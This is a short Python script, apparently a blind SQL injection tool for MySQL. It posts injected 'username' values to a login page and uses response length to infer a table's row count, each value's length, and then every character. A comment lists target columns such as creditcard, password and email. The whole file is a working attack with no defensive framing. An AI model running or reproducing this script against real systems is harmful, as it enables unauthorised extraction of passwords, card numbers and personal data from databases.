# MYSQL - Blind sqli

from requests import post
from string import ascii_letters, digits

class Attack:
    URL = 'https://vuln/login.php'
    SCHEMA_NAME = 'SCHEMA_NAME'
    TABLE_NAME = 'TABLE_NAME'
    COLUMN_NAME = 'COLUMN_NAME'
    ORDER_COLUMN = 'ORDER_COLUMN'
    # city,country,creditcard,credittype,dob,email,firstname,gender,lastname,password,postal,state,street,username
    DEBUG = True

    def __init__(self) -> None:
        total_records = self.get_total_record()
        self.get_records(total_records)

    def get_total_record(self) -> int:
        for guess in range(1, 100):
            p = {"username": f"admin' and (SELECT COUNT(*)={guess} FROM {self.SCHEMA_NAME}.{self.TABLE_NAME})#", "password": "<ignore>"}
            resp = post(self.URL, data=p)
            if self.DEBUG:
                print(guess, len(resp.text))
            if len(resp.text) > 2000:
                print(f'len(total_record)={guess}')
                return guess

    def get_record_length(self, index: int) -> int:
        for record_length in range(1, 256):
            p = {"username": f"admin' and (SELECT LENGTH((SELECT {self.COLUMN_NAME} FROM {self.SCHEMA_NAME}.{self.TABLE_NAME} ORDER BY {self.ORDER_COLUMN} LIMIT 1 OFFSET {index}))={record_length})#", "password": "<ignore>"}
            resp = post(self.URL, data=p)
            if self.DEBUG:
                print(record_length, len(resp.text))
            if len(resp.text) > 2000:
                print(f'len(record[{index}])={record_length}')
                return record_length


    def get_records(self, n: int) -> None:
        for record_index in range(n):
            record_length = self.get_record_length(record_index)
            record = ''
            for name_index in range(1, record_length+1):
                for guess in ascii_letters + digits:
                    p = {"username": f"admin' and (SELECT ASCII(SUBSTRING((SELECT {self.COLUMN_NAME} FROM {self.SCHEMA_NAME}.{self.TABLE_NAME} ORDER BY {self.ORDER_COLUMN} LIMIT 1 OFFSET {record_index}),{name_index},1))={ord(guess)})#", "password": "<ignore>"}
                    resp = post(self.URL, data=p)
                    if self.DEBUG:
                        print(guess, len(resp.text))
                    if len(resp.text) > 2000:
                        record += guess
                        print(f'record[{record_index}][{name_index}/{record_length}]={record}')
                        break

if __name__ == '__main__':
    Attack()
